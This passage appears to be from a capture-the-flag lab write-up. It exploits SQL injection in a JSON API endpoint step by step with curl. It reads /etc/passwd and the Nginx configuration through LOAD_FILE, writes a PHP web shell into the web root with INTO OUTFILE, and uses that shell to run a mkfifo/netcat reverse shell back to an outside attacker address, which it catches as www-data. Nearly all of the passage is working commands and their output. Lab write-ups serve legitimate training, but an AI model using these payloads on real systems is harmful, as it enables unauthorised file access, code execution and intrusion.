## Writing a Web Shell via SQL Injection

The SQL injection vulnerability can also be exploited to read and write arbitrary files.

```bash
$ curl -X GET -H 'Content-Type: application/json' -d $'{"id": "100 UNION SELECT 1,2,LOAD_FILE(\'/etc/passwd\')--", "secret": true}' http://10.129.227.109/api/getprofile
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
```

The default Nginx configuration at `/etc/nginx/sites-enabled/default` indicates the Laravel web application lives is `/srv/altered/public`.

```bash
$ curl -X GET -H 'Content-Type: application/json' -d $'{"id": "100 UNION SELECT 1,2,LOAD_FILE(\'/etc/nginx/sites-enabled/default\')--", "secret": true}' http://10.129.227.109/api/getprofile --output -
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /srv/altered/public;

    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-Content-Type-Options "nosniff";

    set $realip $remote_addr;
    if ($http_x_forwarded_for ~ "^(\d+\.\d+\.\d+\.\d+)") {
        set $realip $1;
    }

    index index.php;

    charset utf-8;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    error_page 404 /index.php;

    location ~ \.php$ {
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~ /\.(?!well-known).* {
        deny all;
    }
}
```

Attempt to write PHP code to the web application's root.

```bash
$ curl -i -s -k -X $'GET' \
    -H $'Host: 10.129.227.109' -H $'User-Agent: curl/7.74.0' -H $'Accept: */*' -H $'Content-Type: application/json' -H $'Content-Length: 135' -H $'Connection: close' \
    --data-binary $'{\"id\": \"100 UNION SELECT 1,2,\'<?php echo system($_REQUEST[\\\"cmd\\\"]); ?>\' INTO OUTFILE \'/srv/altered/public/woo.php\'--\", \"secret\": true}' \
    $'http://10.129.227.109/api/getprofile'
```

```bash
$ curl 'http://10.129.227.109/woo.php?cmd=whoami'
1       2       www-data
www-data
```

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: 10.129.227.109' -H $'User-Agent: curl/7.74.0' -H $'Accept: */*' -H $'Connection: close' \
    $'http://10.129.227.109/woo.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.10.14.40+9000+>/tmp/f'
```

Catch the shell.

```bash
www-data@altered:/srv/altered/public$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),117(mysql)
```
